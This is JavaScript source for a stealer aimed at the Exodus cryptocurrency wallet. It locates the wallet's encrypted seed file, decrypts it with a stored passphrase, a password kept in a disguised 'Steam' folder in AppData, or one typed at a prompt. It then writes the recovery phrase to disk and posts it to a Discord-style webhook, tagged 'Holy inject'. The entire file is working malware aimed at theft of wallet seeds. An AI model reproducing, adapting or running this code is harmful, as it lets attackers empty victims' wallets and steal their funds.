const { execSync } = require("child_process");
const path = require("path");
const fs = require("fs");

const modules = {
  "seco-file": "seco",
  "bitcoin-seed": "bs",
  "zlib": "zlib",
  "fs": "fs",
  "path": "path",
  "readline": "readline",
  "https": "https",
  "os": "os"
};

const imports = {};
let installedSomething = false;

for (const [moduleName, variableName] of Object.entries(modules)) {
  try {
    imports[variableName] = require(moduleName);
  } catch {
    console.log(`Installing missing module: ${moduleName}`);
    execSync(`npm install ${moduleName}`, { stdio: "inherit", cwd: __dirname });
    installedSomething = true;
  }
}

if (installedSomething) {
  execSync(`node "${process.argv[1]}"`, { stdio: "inherit" });
  process.exit(0);
}

const seco = require("seco-file");
const zlib = require("zlib");
const bs = require("bitcoin-seed");
const readline = require("readline");
const https = require("https");

function shrink(buffer) {
  const size = buffer.readUInt32BE(0);
  return buffer.slice(4, 4 + size);
}

async function decrypt(secoPath, password) {
  const result = await seco.read(secoPath, password);
  const decryptedBuffer = result.data;
  const shrinked = shrink(decryptedBuffer);
  const gunzipped = zlib.gunzipSync(shrinked);
  return bs.fromBuffer(gunzipped).mnemonicString;
}

function locateExodus() {
  const exodusDir = path.resolve(process.env.APPDATA || "", "exodus", "exodus.wallet");
  const seedPath = path.join(exodusDir, "seed.seco");
  const passphrasePath = path.join(exodusDir, "passphrase.json");

  if (fs.existsSync(seedPath)) {
    return {
      found: true,
      seedPath,
      passphrasePath,
      passwordRequired: !fs.existsSync(passphrasePath),
    };
  }
  return { found: false };
}

function readPasswordFromFile() {
  try {
    const username = require("os").userInfo().username;
    const passwordPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Wallet\\Exodus\\password.txt`;

    if (!fs.existsSync(passwordPath)) return null;

    const password = fs.readFileSync(passwordPath, "utf8").trim();
    if (!password) return null;

    return password;
  } catch (err) {
    console.error("[Error] Failed to read password file:", err.message);
    return null;
  }
}

function saveMnemonicToFile(mnemonic) {
  try {
    const username = require("os").userInfo().username;
    const phrasesPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Wallet\\Exodus\\seed.txt`;

    const dirPath = path.dirname(phrasesPath);
    if (!fs.existsSync(dirPath)) {
      fs.mkdirSync(dirPath, { recursive: true });
    }

    fs.writeFileSync(phrasesPath, mnemonic, "utf8");
    return true;
  } catch (err) {
    console.error("[Error] Failed to save mnemonic to file:", err.message);
    return false;
  }
}

function sendToWebhook(mnemonic) {
  return new Promise((resolve) => {
    try {
      const username = require("os").userInfo().username;
      const webhookPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\hook\\webhook.txt`;

      if (!fs.existsSync(webhookPath)) return resolve(false);

      const webhookUrl = fs.readFileSync(webhookPath, "utf8").trim();
      if (!webhookUrl) return resolve(false);

      const data = JSON.stringify({
        username: "Exodus",
        embeds: [
          {
            title: "🔐 Exodus Wallet",
            description: `**Mnemonic Phrase:**\n\`\`\`ansi\n[2;32m${mnemonic}[0m[2;32m[0m\`\`\``,
            color: 3553599,
            footer: { text: "Holy inject" },
            timestamp: new Date().toISOString(),
          },
        ],
      });

      const url = new URL(webhookUrl);
      const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(data),
        },
      };

      const req = https.request(options, (res) => {
        res.on("data", () => {});
        res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300));
      });

      req.on("error", (err) => {
        console.error("[Error] Failed to send to webhook:", err.message);
        resolve(false);
      });

      req.write(data);
      req.end();
    } catch (err) {
      console.error("[Error] Webhook setup failed:", err.message);
      resolve(false);
    }
  });
}

function promptHidden(question) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true });
    const stdin = process.stdin;
    const onData = (char) => {
      char = String(char);
      switch (char) {
        case "\n":
        case "\r":
        case "\u0004":
          stdin.pause();
          break;
        default:
          process.stdout.clearLine(0);
          process.stdout.cursorTo(0);
          process.stdout.write(question + Array(rl.line.length + 1).join("*"));
          break;
      }
    };
    process.stdout.write(question);
    stdin.on("data", onData);
    rl.question("", (answer) => {
      stdin.removeListener("data", onData);
      rl.close();
      process.stdout.write("\n");
      resolve(answer);
    });
  });
}

async function main(suppliedPath) {
  try {
    let seedPath = suppliedPath;
    let passphrasePath = null;
    let passwordRequired = true;

    if (!seedPath) {
      const info = locateExodus();
      if (!info.found) {
        console.error("[Error] Could not find Exodus seed file automatically.");
        process.exit(1);
      }
      seedPath = info.seedPath;
      passphrasePath = info.passphrasePath;
      passwordRequired = info.passwordRequired;
    } else {
      if (!fs.existsSync(seedPath)) {
        console.error("[Error] Provided seed file does not exist:", seedPath);
        process.exit(2);
      }
      passphrasePath = path.join(path.dirname(seedPath), "passphrase.json");
      passwordRequired = !fs.existsSync(passphrasePath);
    }

    if (!passwordRequired) {
      const saved = JSON.parse(fs.readFileSync(passphrasePath, "utf8"));
      if (saved && saved.passphrase) {
        try {
          const mnemonic = await decrypt(seedPath, saved.passphrase);
          saveMnemonicToFile(mnemonic);
          await sendToWebhook(mnemonic);
          return;
        } catch (err) {
          console.error("[Error] Saved passphrase failed to decrypt:", err.message);
        }
      }
    }

    const filePassword = readPasswordFromFile();
    if (filePassword) {
      try {
        const mnemonic = await decrypt(seedPath, filePassword);
        saveMnemonicToFile(mnemonic);
        await sendToWebhook(mnemonic);
        return;
      } catch (err) {
        console.error("[Fail] Decrypt with file password failed:", err.message);
      }
    }

    const pwd = await promptHidden("Enter password (blank to quit): ");
    if (!pwd) return;

    try {
      const mnemonic = await decrypt(seedPath, pwd);
      saveMnemonicToFile(mnemonic);
      await sendToWebhook(mnemonic);
    } catch (err) {
      console.error("[Fail] Decrypt failed:", err.message);
    }
  } catch (err) {
    console.error("[Fatal] Unexpected error:", err?.message || err);
  }
}

const supplied = process.argv[2];
main(supplied);
